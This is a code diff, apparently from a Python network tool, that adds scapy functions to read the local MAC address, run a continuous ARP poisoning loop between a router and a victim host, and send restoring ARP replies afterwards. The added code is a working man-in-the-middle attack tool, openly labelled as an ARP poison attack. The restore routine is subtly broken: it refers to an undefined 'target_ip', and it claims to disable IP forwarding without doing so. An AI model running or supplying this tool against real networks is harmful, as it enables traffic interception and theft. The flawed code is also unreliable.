@@ -35,7 +35,29 @@ def ip_scanning(networkSplit, timeout=5):
 
     return found_ips
 
+def my_mac():
+    interface = scapy.all.get_working_if()
+    mac_address = get_if_hwaddr(interface)
+    return mac_address
 
+
+def restoring(ip_router, mac_router, ip_vic, mac_vic):
+    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip_router, hwsrc=mac_vic, psrc=ip_vic), count=5)
+    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=target_ip, hwsrc=mac_router, psrc=ip_router), count=5)
+    print("[*] Disabling IP forwarding")
+
+
+def arp_spoofing(ip_router, mac_router, ip_vic, mac_vic):
+    mac_me = my_mac()
+    print("[*] Started ARP poison attack [CTRL-C to stop]")
+    try:
+        while True:
+            send(ARP(op=2, pdst=ip_router, hwdst=mac_router, psrc=ip_vic, hwsrc=mac_me))
+            send(ARP(op=2, pdst=ip_vic, hwdst=mac_vic, psrc=ip_router, hwsrc=mac_me))
+            time.sleep(2)
+    except KeyboardInterrupt:
+        print("[*] Stopped ARP poison attack. Restoring network")
+        restoring(ip_router, mac_router, ip_vic, mac_vic)
 
 
 
